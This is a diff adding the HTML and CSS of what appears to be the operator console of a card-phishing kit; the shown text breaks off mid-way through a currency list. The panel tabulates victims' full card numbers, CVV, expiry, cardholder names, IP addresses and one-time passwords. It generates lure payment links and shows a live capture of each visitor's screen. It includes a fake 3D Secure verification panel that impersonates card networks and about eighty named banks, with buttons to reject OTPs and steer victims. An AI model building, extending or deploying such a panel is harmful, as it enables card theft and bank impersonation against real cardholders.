@@ -1,0 +1,3700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Panel</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <style>
+    body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
+    h1 { text-align: center; margin-bottom: 20px; }
+    .container { max-width: 1200px; margin: 0 auto; }
+    .generate-link { background: #222; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+    .form-group { margin-bottom: 15px; }
+    label { display: block; margin-bottom: 5px; color: #aaa; }
+    input, textarea { width: 100%; padding: 8px; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
+    .payment-link { margin-top: 15px; padding: 10px; background: #333; border-radius: 4px; display: none; }
+    .copy-btn { background: #22c55e; border: none; color: #fff; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-left: 10px; }
+    table { width: 100%; border-collapse: collapse; background: #111; margin-bottom: 20px; }
+    th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 12px; }
+    th { background: #222; }
+    tr:nth-child(even) { background: #222; }
+    button { background: #4a90e2; color: #fff; border: none; padding: 6px 10px; margin-right: 4px; cursor: pointer; border-radius: 4px; font-size: 12px; transition: all 0.3s ease; }
+    button:hover { background: #357ABD; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
+    button:disabled { background: #666; cursor: not-allowed; transform: none; box-shadow: none; }
+    .status-badge { padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; }
+    .status-processing { background: #f59e0b; color: #000; }
+    .status-otp_pending { background: #3b82f6; color: #fff; }
+    .status-otp_received { background: #8b5cf6; color: #fff; }
+    .status-success { background: #22c55e; color: #fff; }
+    .status-fail { background: #ef4444; color: #fff; }
+    .otp-received { background-color: #10B981; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
+    .show-otp-btn { background: #22c55e; }
+    .bank-page-btn { background: #8b5cf6; }
+    .bank-page-btn:hover { background: #7c3aed; }
+    .show-otp-btn:disabled { background: #666; }
+    .wrong-otp-btn { background: #ef4444; }
+    .wrong-otp-btn:hover { background: #dc2626; }
+    .reason-dropdown { 
+      background: #333; 
+      color: #fff; 
+      border: 1px solid #555; 
+      padding: 4px 8px; 
+      border-radius: 4px;
+      width: 100%;
+      margin-bottom: 5px;
+      transition: all 0.3s ease;
+    }
+    .reason-dropdown:focus {
+      border-color: #4a90e2;
+      box-shadow: 0 0 0 2px rgba(74, 144, 226, 0.25);
+    }
+    .fail-btn {
+      background: #ef4444;
+      width: 100%;
+      padding: 4px 0;
+      margin-top: 5px;
+    }
+    .fail-btn:hover { background: #dc2626; }
+    .reason-container {
+      margin-top: 8px;
+      width: 100%;
+    }
+    /* Loading indicator */
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .hidden {
+      display: none;
+    }
+    /* Error message */
+    .error-message {
+      background-color: #ef4444;
+      color: white;
+      padding: 10px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      display: none;
+      animation: slideIn 0.3s ease-out;
+    }
+    /* Success message */
+    .success-message {
+      background-color: #22c55e;
+      color: white;
+      padding: 10px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      display: none;
+      animation: slideIn 0.3s ease-out;
+    }
+    /* Visitors section */
+    .visitors-container {
+      background: #222;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
+    }
+    .visitors-container:hover {
+      box-shadow: 0 6px 16px rgba(0,0,0,0.3);
+    }
+    .visitor-item {
+      display: flex;
+      align-items: flex-start;
+      padding: 10px;
+      border-bottom: 1px solid #333;
+      flex-wrap: wrap;
+      transition: all 0.3s ease;
+    }
+    .visitor-item.new {
+      animation: highlight 3s ease-out;
+    }
+    .visitor-badge {
+      background: #ef4444;
+      color: white;
+      padding: 2px 8px;
+      border-radius: 10px;
+      font-size: 12px;
+      margin-right: 10px;
+      animation: pulse 2s infinite;
+    }
+    .ip-address {
+      background: #333;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-family: monospace;
+      margin-right: 10px;
+    }
+    .visitor-time {
+      color: #aaa;
+      font-size: 12px;
+      margin-left: auto;
+    }
+    /* Animation for new visitors */
+    @keyframes highlight {
+      0% { background-color: rgba(239, 68, 68, 0.5); }
+      100% { background-color: transparent; }
+    }
+    /* Animation for pulsing elements */
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.7; }
+      100% { opacity: 1; }
+    }
+    /* Animation for removing visitors */
+    .fade-out {
+      animation: fadeOut 0.5s ease-out forwards;
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; transform: translateX(30px); }
+    }
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #ef4444;
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      z-index: 1000;
+      animation: slideIn 0.3s ease-out;
+      max-width: 350px;
+    }
+    @keyframes slideIn {
+      0% { transform: translateX(100%); opacity: 0; }
+      100% { transform: translateX(0); opacity: 1; }
+    }
+
+    /* Currency button style */
+    .currency-btn {
+      width: 100%;
+      padding: 4px 0;
+      margin-top: 5px;
+      margin-bottom: 5px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .currency-btn:hover {
+      background-color: #3b82f6;
+      transform: translateY(-2px);
+    }
+    .currency-btn:disabled {
+      background-color: #9CA3AF;
+      cursor: not-allowed;
+      transform: none;
+    }
+    /* Add these styles to your <style> tag */
+    .fixed {
+      position: fixed;
+    }
+    .inset-0 {
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+    }
+    .z-50 {
+      z-index: 50;
+    }
+    .bg-opacity-75 {
+      --bg-opacity: 0.75;
+    }
+    .bg-purple-600 {
+      background-color: #8b5cf6;
+    }
+    .font-mono {
+      font-family: monospace;
+    }
+    .space-y-2 > * + * {
+      margin-top: 0.5rem;
+    }
+    /* New visitor info styles */
+    .visitor-details {
+      display: flex;
+      flex-wrap: wrap;
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      background: #1a1a1a;
+      border-radius: 4px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2) inset;
+    }
+    .visitor-detail {
+      margin-right: 15px;
+      margin-bottom: 8px;
+      font-size: 12px;
+    }
+    .detail-label {
+      font-weight: bold;
+      color: #aaa;
+      margin-right: 5px;
+    }
+    .detail-value {
+      color: #ddd;
+    }
+    .location-link {
+      color: #3b82f6;
+      text-decoration: underline;
+    }
+    .location-link:hover {
+      color: #60a5fa;
+    }
+    .browser-icon {
+      height: 16px;
+      width: 16px;
+      vertical-align: text-bottom;
+      margin-right: 5px;
+    }
+    .country-flag {
+      height: 12px;
+      margin-right: 5px;
+      vertical-align: middle;
+    }
+    /* MC Panel Failure Options */
+    .mc-fail-options {
+      margin-top: 10px;
+      display: none;
+    }
+    .mc-fail-reason-dropdown {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 8px;
+      background: #333;
+      color: white;
+      border: 1px solid #555;
+      border-radius: 4px;
+      transition: all 0.3s ease;
+    }
+    .mc-fail-reason-dropdown:focus {
+      border-color: #ef4444;
+      box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.25);
+    }
+    .fail-options-btn {
+      background-color: #dc2626;
+      color: white;
+      padding: 8px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      margin-bottom: 10px;
+      transition: all 0.3s ease;
+    }
+    .fail-options-btn:hover {
+      background-color: #b91c1c;
+      transform: translateY(-2px);
+    }
+    .fail-transaction-btn {
+      background-color: #ef4444;
+      color: white;
+      padding: 8px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.3s ease;
+    }
+    .fail-transaction-btn:hover {
+      background-color: #dc2626;
+      transform: translateY(-2px);
+    }
+    
+    /* New styles for card highlights and animations */
+    .card-item {
+      border-radius: 8px;
+      margin-bottom: 15px;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+    .card-item:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 15px rgba(0,0,0,0.2);
+    }
+    .card-item.new {
+      animation: card-highlight 5s ease-out;
+    }
+    @keyframes card-highlight {
+      0% { box-shadow: 0 0 0 2px #ef4444, 0 8px 15px rgba(0,0,0,0.2); }
+      70% { box-shadow: 0 0 0 2px #ef4444, 0 8px 15px rgba(0,0,0,0.2); }
+      100% { box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+    }
+    
+    /* Enhanced card detail section */
+    .card-detail-section {
+      background: linear-gradient(135deg, #1f1f1f 0%, #111 100%);
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2) inset;
+      border-left: 3px solid #4a90e2;
+    }
+    .card-detail-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    .card-detail-row:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+    .card-detail-label {
+      color: #aaa;
+      font-size: 12px;
+    }
+    .card-detail-value {
+      color: #fff;
+      font-weight: bold;
+      font-size: 12px;
+    }
+    
+    /* Clear transactions button */
+    .clear-transactions-btn {
+      background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%);
+      color: white;
+      padding: 10px 15px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-bottom: 15px;
+      transition: all 0.3s ease;
+      display: inline-block;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+    .clear-transactions-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 10px rgba(0,0,0,0.2);
+    }
+    
+    /* Status indicators with animations */
+    .status-indicator {
+      display: inline-block;
+      margin-left: 10px;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+    .status-indicator.show {
+      opacity: 1;
+    }
+    
+   /* Admin header section */
+    .admin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      animation: fadeIn 0.5s ease-out;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    /* Mobile optimizations */
+    @media (max-width: 768px) {
+      body { padding: 10px; }
+      
+      .card-mobile-view {
+        display: flex;
+        flex-direction: column;
+      }
+      
+      .card-mobile-commands {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 5px;
+        margin-bottom: 10px;
+      }
+      
+      .card-mobile-commands button {
+        flex: 1 0 auto;
+        min-width: 80px;
+      }
+      
+      .card-mobile-details {
+        order: 2;
+      }
+      
+      table {
+        display: block;
+        overflow-x: auto;
+      }
+      
+      th, td {
+        min-width: 120px;
+      }
+    }
+    
+    /* Screen capture container styles */
+    .screen-container {
+      margin-top: 20px;
+      width: 100%;
+      max-width: 640px;
+      height: 360px;
+      border-radius: 8px;
+      overflow: hidden;
+      background: #111;
+      border: 1px solid #333;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+      position: relative;
+    }
+    .screen-container video, 
+    .screen-container canvas {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+    .screen-container.active {
+      display: block;
+      animation: fadeIn 0.5s ease-out;
+    }
+    .screen-container.inactive {
+      display: none;
+    }
+    .screen-placeholder {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #666;
+      text-align: center;
+      padding: 20px;
+    }
+    .screen-placeholder .icon {
+      font-size: 48px;
+      margin-bottom: 15px;
+    }
+    .screen-controls {
+      margin-top: 10px;
+      display: flex;
+      gap: 10px;
+    }
+    .screen-controls button {
+      flex: 1;
+      padding: 8px;
+      border-radius: 4px;
+      background: #333;
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .screen-controls button:hover {
+      background: #444;
+      transform: translateY(-2px);
+    }
+    .screen-controls button.stop {
+      background: #ef4444;
+    }
+    .screen-controls button.stop:hover {
+      background: #dc2626;
+    }
+    .capture-status {
+      margin-top: 5px;
+      font-size: 12px;
+      color: #aaa;
+    }
+    .capture-status.active {
+      color: #22c55e;
+    }
+    .capture-status.error {
+      color: #ef4444;
+    }
+    /* Activity indicator for visitors */
+    .activity-indicator {
+      margin-left: 5px;
+      font-weight: bold;
+      color: #22c55e;
+      transition: opacity 0.5s ease;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="admin-header">
+      <h1>Admin Panel</h1>
+      <button id="clearTransactionsBtn" class="clear-transactions-btn">Clear All Transactions</button>
+    </div>
+
+    <div id="error-msg" class="error-message"></div>
+    <div id="success-msg" class="success-message"></div>
+
+    <div class="admin-header">
+  <h1>Admin Panel</h1>
+  <div>
+    <button id="downloadTransactionsBtn" class="clear-transactions-btn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); margin-right: 10px;">
+      <i class="fas fa-download"></i> Download CSV
+    </button>
+    <button id="clearTransactionsBtn" class="clear-transactions-btn">Clear All Transactions</button>
+  </div>
+</div>
+    
+    <!-- Visitors Section with Screen Sharing -->
+    <div class="visitors-container">
+      <h2>Active Visitors</h2>
+      <div id="visitors-list">
+        <p>No visitors yet</p>
+      </div>
+      
+<!-- Screen capture container -->
+<div id="screenCaptureContainer" class="screen-container">
+  <canvas id="screenCanvas"></canvas>
+  <div class="screen-placeholder" id="screenPlaceholder">
+    <div class="icon">📺</div>
+    <p>Waiting for screen capture to begin...</p>
+    <p>When a visitor opens the payment link, their screen will appear here.</p>
+  </div>
+</div>
+<div class="screen-controls">
+  <button id="stopScreenShareBtn" class="stop">Stop Screen Share</button>
+  <button id="enlargeScreenBtn">Enlarge</button>
+  <button id="recordScreenBtn">Record</button>
+  <button id="refreshCaptureBtn">Refresh Capture</button>
+</div>
+<div id="captureStatus" class="capture-status">No active screen share</div>
+    </div>
+
+    <div class="generate-link">
+      <h2>Generate Payment Link</h2>
+      <form id="generateLinkForm">
+        <div class="form-group">
+          <label>Amount (INR)</label>
+          <input type="number" id="amount" required min="1" step="1">
+        </div>
+        <div class="form-group">
+          <label>Description</label>
+          <textarea id="description" rows="2" required></textarea>
+        </div>
+        <button type="submit">Generate Link</button>
+      </form>
+      <div id="paymentLinkContainer" class="payment-link">
+        <span>Payment Link: </span>
+        <span id="paymentLink"></span>
+        <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
+      </div>
+    </div>
+
+    <!-- New section for generating free links -->
+<div class="generate-link">
+  <h2>Generate Free Link</h2>
+  <form id="generateFreeLinkForm">
+    <div class="form-group">
+      <label>Description (Optional)</label>
+      <textarea id="freeDescription" rows="2" placeholder="Enter description if needed"></textarea>
+    </div>
+    <button type="submit" style="background-color: #22c55e;">Generate Free Link</button>
+  </form>
+  <div id="freeLinkContainer" class="payment-link" style="display: none;">
+    <span>Free Link: </span>
+    <span id="freeLink"></span>
+    <button class="copy-btn" onclick="copyFreeLink()">Copy</button>
+  </div>
+</div>
+    
+    <!-- New section for expiring payment links -->
+    <div class="generate-link">
+      <h2>Expire Payment Link</h2>
+      <form id="expireLinkForm">
+        <div class="form-group">
+          <label>Payment ID (pid)</label>
+          <input type="text" id="expirePid" required placeholder="Enter payment ID to expire">
+        </div>
+        <button type="submit" style="background-color: #ef4444;">Expire Link</button>
+      </form>
+      <div id="expireResultContainer" class="payment-link" style="display: none;">
+        <span id="expireResult"></span>
+      </div>
+    </div>
+
+    <h2>Transactions</h2>
+    <div id="transactionsLoading" style="text-align:center;">
+      <span class="loading"></span> Loading transactions...
+    </div>
+    <table id="transactionsTable">
+      <thead>
+        <tr>
+          <th>Invoice ID</th>
+          <th>Email</th>
+          <th>Amount</th>
+          <th>Currency</th>
+          <th>Card Number</th>
+          <th>CVV</th>
+          <th>Expiry</th>
+          <th>Cardholder</th>
+          <th>IP Address</th>
+          <th>OTP</th>
+          <th>Status</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <!-- MC OTP Panel - UPDATED with Verification Type selector, Currency selector and failure reason options -->
+  <div id="mcOtpPanel" class="fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center hidden">
+    <div class="bg-gray-800 p-6 rounded-lg max-w-md w-full">
+      <h3 class="text-xl font-bold mb-4">3D Secure Verification</h3>
+      
+      <!-- Verification Type Selector -->
+      <div class="mb-4">
+  <label class="block text-sm mb-2">Verification Type:</label>
+  <select id="mcVerificationType" class="bg-gray-700 text-white w-full p-2 rounded">
+    <option value="mastercard">Mastercard SecureCode</option>
+    <option value="visa">Verified by Visa</option>
+    <option value="amex">American Express SafeKey</option>
+    <option value="discover">Discover ProtectBuy</option>
+    <option value="rupay">RuPay PaySecure</option>
+  </select>
+</div>
+      
+      <div class="mb-4">
+        <label class="block text-sm mb-2">Bank:</label>
+        <select id="mcBankSelect" class="bg-gray-700 text-white w-full p-2 rounded">
+          <option value="default">mastercard securecode</option>
+         <option value="sbi">State Bank of India</option>
+          <option value="hdfc">HDFC Bank</option>
+          <option value="icici">ICICI Bank</option>
+          <option value="axis">Axis Bank</option>
+          <option value="kotak">Kotak Mahindra</option>
+          <option value="yes">Yes Bank</option>
+          <option value="dbs taiwan">dbs taiwan</option>
+          <option value="tanshin">tanshin</option>
+          <option value="hsbc">hsbc</option>
+          <option value="standard charterd">standard charterd</option>
+          <option value="boi">boi</option>
+          <option value="bob">bob</option>
+          <option value="centralbankindia">centralbankindia</option>
+          <option value="boa">boa</option>
+          <option value="citibank">citibank</option>
+          <option value="usbank">usbank</option>
+          <option value="wellsfargo">wellsfargo</option>
+          <option value="nimb">nimb</option>
+          <option value="bank of maga">bank of maga</option>
+          <option value="gibraltar">Gibraltar International Bank</option>
+          <option value="unionbankindia">unionbankindia</option>
+          <option value="pnb">pnb</option>
+          <option value="canera bank">canera bank</option>
+          <option value="capitalone">capitalone</option>
+          <option value="td bank">td bank</option>
+          <option value="citizens">citizens</option>
+          <option value="truist">truist</option>
+          <option value="novascotia">novascotia</option>
+          <option value="cathy united taiwan">cathy united taiwan</option>
+          <option value="sinopac bank taiwan">sinopac bank taiwan</option>
+          <option value="hua nan bank taiwan">hua nan bank taiwan</option>
+          <option value="landbank taiwan">landbank taiwan</option>
+          <option value="un bank taiwan">un bank taiwan</option>
+          <option value="KGI bank taiwan">KGI bank taiwan</option>
+          <option value="usaa bank">usaa bank</option>
+          <option value="huntington">huntington</option>
+          <option value="mnt bank">m&t bank</option>
+          <option value="barclays bank">barclays bank</option>
+          <option value="santandar usa">santandar usa</option>
+          <option value="morganstanley">morganstanley</option>
+          <option value="bancorp">bancorp</option>
+          <option value="pnc">pnc</option>
+          <option value="charles schweb">charles schweb</option>
+          <option value="BMO USA">BMO USA</option>
+          <option value="First Citizens">First Citizens</option>
+          <option value="Fifth Third Bank">Fifth Third Bank</option>
+          <option value="Ally Financial">Ally Financial</option>
+          <option value="KeyCorp">KeyCorp</option>
+          <option value="Webster Bank">Webster Bank</option>
+          <option value="BNP Paribas">BNP Paribas</option>
+          <option value="SoFi">SoFi</option>
+          <option value="Columbia Bank">Columbia Bank</option>
+          <option value="Texas Capital Bank">Texas Capital Bank</option>
+          <option value="Arvest Bank">Arvest Bank</option>
+          <option value="Indian allahabad Bank">Indian allahabad Bank</option>
+          <option value="Indian Overseas Bank">Indian Overseas Bank</option>
+          <option value="Federal Bank">Federal Bank</option>
+          <option value="IDBI Bank">IDBI Bank</option>
+          <option value="IDFC First Bank">IDFC First Bank</option>
+          <option value="Northern Trust">Northern Trust</option>
+          <option value="Synchrony Financial">Synchrony Financial</option>
+          <option value="Deutsche Bank">Deutsche Bank</option>
+          <option value="First Horizon">First Horizon</option>
+          <option value="IndusInd Bank">IndusInd Bank</option>
+          <option value="Jammu & Kashmir Bank">Jammu & Kashmir Bank</option>
+          <option value="Karnataka Bank">Karnataka Bank</option>
+          <option value="RBL Bank">RBL Bank</option>
+          <option value="UCO Bank">UCO Bank</option>
+          <option value="BBVA Mexico">BBVA Mexico</option>
+          <option value="Banorte Mexico">Banorte Mexico</option>
+          <option value="Citibanamex México">Citibanamex México</option>
+          <option value="Lloyds Banking Group">Lloyds Banking Group</option>
+          <option value="NatWest Group">NatWest Group</option>
+          <option value="Starling Bank">Starling Bank</option>
+          <option value="Royal Bank of Canada">Royal Bank of Canada</option>
+          <option value="Bank of Montreal">Bank of Montreal</option>
+          <option value="Canadian Imperial Bank of Commerce">Canadian Imperial Bank of Commerce</option>
+          <option value="Commerzbank">Commerzbank</option>
+          <option value="N26">N26v</option>
+          <option value="Bunq">Bunq</option>
+        </select>
+      </div>
+      
+      <!-- Currency Selector - ADDED -->
+      <div class="mb-4">
+        <label class="block text-sm mb-2">Currency:</label>
+        <select id="mcCurrencySelect" class="bg-gray-700 text-white w-full p-2 rounded">
+          <option value="INR">INR - Indian Rupee</option>
+          <option value="USD">USD - US Dollar</option>
+          <option value="EUR">EUR - Euro</option>
+          <option value="GBP">GBP - British Pound</option>
+          <option value="JPY">JPY - Japanese Yen</option>
+          <option value="AUD">AUD - Australian Dollar</option>
+          <option value="CAD">CAD - Canadian Dollar</option>
+          <option value="CHF">CHF - Swiss Franc</option>
+          <option value="CNY">CNY - Chinese Yuan</option>
+          <option value="HKD">HKD - Hong Kong Dollar</option>
+          <option value="NZD">NZD - New Zealand Dollar</option>
+          <option value="SGD">SGD - Singapore Dollar</option>
+          <option value="TWD">TWD - Taiwan Dollar</option>
+          <option value="AED">AED - UAE Dirham</option>
+          <option value="THB">THB - Thai Baht</option>
+          <option value="SEK">SEK - Swedish Krona</option>
+          <option value="NOK">NOK - Norwegian Krone</option>
+          <option value="DKK">DKK - Danish Krone</option>
+          <option value="ZAR">ZAR - South African Rand</option>
+          <option value="MYR">MYR - Malaysian Ringgit</option>
+          <option value="IDR">IDR - Indonesian Rupiah</option>
+          <option value="PHP">PHP - Philippine Peso</option>
+          <option value="MXN">MXN - Mexican Peso</option>
+          <option value="BRL">BRL - Brazilian Real</option>
+          <option value="PLN">PLN - Polish Złoty</option>
+          <option value="RUB">RUB - Russian Ruble</option>
+          <option value="TRY">TRY - Turkish Lira</option>
+          <option value="KRW">KRW - South Korean Won</option>
+          <option value="ILS">ILS - Israeli Shekel</option>
+          <option value="SAR">SAR - Saudi Riyal</option>
+          <option value="ARS">ARS - Argentine Peso</option>
+          <option value="CLP">CLP - Chilean Peso</option>
+          <option value="EGP">EGP - Egyptian Pound</option>
+          <option value="COP">COP - Colombian Peso</option>
+          <option value="VND">VND - Vietnamese Dong</option>
+          <option value="AFN">AFN - Afghan Afghani</option>
+<option value="ALL">ALL - Albanian Lek</option>
+<option value="DZD">DZD - Algerian Dinar</option>
+<option value="AOA">AOA - Angolan Kwanza</option>
+<option value="ARS">ARS - Argentine Peso</option>
+<option value="AUD">AUD - Australian Dollar</option>
+<option value="AWG">AWG - Aruban Florin</option>
+<option value="AZN">AZN - Azerbaijani Manat</option>
+<option value="BAM">BAM - Bosnian Convertible Marka</option>
+<option value="BBD">BBD - Barbadian Dollar</option>
+<option value="BDT">BDT - Bangladeshi Taka</option>
+<option value="BGN">BGN - Bulgarian Lev</option>
+<option value="BHD">BHD - Bahraini Dinar</option>
+<option value="BIF">BIF - Burundian Franc</option>
+<option value="BMD">BMD - Bermudian Dollar</option>
+<option value="BND">BND - Brunei Dollar</option>
+<option value="BOB">BOB - Bolivian Boliviano</option>
+<option value="BRL">BRL - Brazilian Real</option>
+<option value="BSD">BSD - Bahamian Dollar</option>
+<option value="BTN">BTN - Bhutanese Ngultrum</option>
+<option value="BWP">BWP - Botswanan Pula</option>
+<option value="BYN">BYN - Belarusian Ruble</option>
+<option value="BZD">BZD - Belize Dollar</option>
+<option value="CAD">CAD - Canadian Dollar</option>
+<option value="CDF">CDF - Congolese Franc</option>
+<option value="CHF">CHF - Swiss Franc</option>
+<option value="CLP">CLP - Chilean Peso</option>
+<option value="CNY">CNY - Chinese Yuan</option>
+<option value="COP">COP - Colombian Peso</option>
+<option value="CRC">CRC - Costa Rican Colón</option>
+<option value="CUP">CUP - Cuban Peso</option>
+<option value="CVE">CVE - Cape Verdean Escudo</option>
+<option value="CZK">CZK - Czech Koruna</option>
+<option value="DJF">DJF - Djiboutian Franc</option>
+<option value="DKK">DKK - Danish Krone</option>
+<option value="DOP">DOP - Dominican Peso</option>
+<option value="DZD">DZD - Algerian Dinar</option>
+<option value="EGP">EGP - Egyptian Pound</option>
+<option value="ERN">ERN - Eritrean Nakfa</option>
+<option value="ETB">ETB - Ethiopian Birr</option>
+<option value="EUR">EUR - Euro</option>
+<option value="FJD">FJD - Fijian Dollar</option>
+<option value="FKP">FKP - Falkland Islands Pound</option>
+<option value="GBP">GBP - British Pound</option>
+<option value="GEL">GEL - Georgian Lari</option>
+<option value="GHS">GHS - Ghanaian Cedi</option>
+<option value="GIP">GIP - Gibraltarian Pound</option>
+<option value="GMD">GMD - Gambian Dalasi</option>
+<option value="GNF">GNF - Guinean Franc</option>
+<option value="GTQ">GTQ - Guatemalan Quetzal</option>
+<option value="GYD">GYD - Guyanaese Dollar</option>
+<option value="HKD">HKD - Hong Kong Dollar</option>
+<option value="HNL">HNL - Honduran Lempira</option>
+<option value="HRK">HRK - Croatian Kuna</option>
+<option value="HTG">HTG - Haitian Gourde</option>
+<option value="HUF">HUF - Hungarian Forint</option>
+<option value="IDR">IDR - Indonesian Rupiah</option>
+<option value="ILS">ILS - Israeli Shekel</option>
+<option value="INR">INR - Indian Rupee</option>
+<option value="IQD">IQD - Iraqi Dinar</option>
+<option value="IRR">IRR - Iranian Rial</option>
+<option value="ISK">ISK - Icelandic Króna</option>
+<option value="JMD">JMD - Jamaican Dollar</option>
+<option value="JOD">JOD - Jordanian Dinar</option>
+<option value="JPY">JPY - Japanese Yen</option>
+<option value="KES">KES - Kenyan Shilling</option>
+<option value="KGS">KGS - Kyrgyzstani Som</option>
+<option value="KHR">KHR - Cambodian Riel</option>
+<option value="KMF">KMF - Comorian Franc</option>
+<option value="KPW">KPW - North Korean Won</option>
+<option value="KRW">KRW - South Korean Won</option>
+<option value="KWD">KWD - Kuwaiti Dinar</option>
+<option value="KYD">KYD - Cayman Islands Dollar</option>
+<option value="KZT">KZT - Kazakhstani Tenge</option>
+<option value="LAK">LAK - Laotian Kip</option>
+<option value="LBP">LBP - Lebanese Pound</option>
+<option value="LKR">LKR - Sri Lankan Rupee</option>
+<option value="LRD">LRD - Liberian Dollar</option>
+<option value="LSL">LSL - Lesotho Loti</option>
+<option value="LTL">LTL - Lithuanian Litas</option>
+<option value="LVL">LVL - Latvian Lats</option>
+<option value="MAD">MAD - Moroccan Dirham</option>
+<option value="MDL">MDL - Moldovan Leu</option>
+<option value="MGA">MGA - Malagasy Ariary</option>
+<option value="MKD">MKD - Macedonian Denar</option>
+<option value="MMK">MMK - Myanmar Kyat</option>
+<option value="MNT">MNT - Mongolian Tugrik</option>
+<option value="MOP">MOP - Macanese Pataca</option>
+<option value="MRU">MRU - Mauritanian Ouguiya</option>
+<option value="MUR">MUR - Mauritian Rupee</option>
+<option value="MWK">MWK - Malawian Kwacha</option>
+<option value="MXN">MXN - Mexican Peso</option>
+<option value="MYR">MYR - Malaysian Ringgit</option>
+<option value="MZN">MZN - Mozambican Metical</option>
+<option value="NAD">NAD - Namibian Dollar</option>
+<option value="NGN">NGN - Nigerian Naira</option>
+<option value="NIO">NIO - Nicaraguan Córdoba</option>
+<option value="NPR">NPR - Nepalese Rupee</option>
+<option value="NZD">NZD - New Zealand Dollar</option>
+<option value="OMR">OMR - Omani Rial</option>
+<option value="PAB">PAB - Panamanian Balboa</option>
+<option value="PEN">PEN - Peruvian Nuevo Sol</option>
+<option value="PGK">PGK - Papua New Guinean Kina</option>
+<option value="PHP">PHP - Philippine Peso</option>
+<option value="PKR">PKR - Pakistani Rupee</option>
+<option value="PLN">PLN - Polish Złoty</option>
+<option value="PYG">PYG - Paraguayan Guaraní</option>
+<option value="QAR">QAR - Qatari Rial</option>
+<option value="RON">RON - Romanian Leu</option>
+<option value="RSD">RSD - Serbian Dinar</option>
+<option value="RUB">RUB - Russian Ruble</option>
+<option value="RWF">RWF - Rwandan Franc</option>
+<option value="SAR">SAR - Saudi Riyal</option>
+<option value="SBD">SBD - Solomon Islands Dollar</option>
+<option value="SCR">SCR - Seychellois Rupee</option>
+<option value="SDG">SDG - Sudanese Pound</option>
+<option value="SEK">SEK - Swedish Krona</option>
+<option value="SGD">SGD - Singapore Dollar</option>
+<option value="SHP">SHP - Saint Helena Pound</option>
+<option value="SLL">SLL - Sierra Leonean Leone</option>
+<option value="SOS">SOS - Somali Shilling</option>
+<option value="SRD">SRD - Surinamese Dollar</option>
+<option value="SSP">SSP - South Sudanese Pound</option>
+<option value="STN">STN - São Tomé and Príncipe Dobra</option>
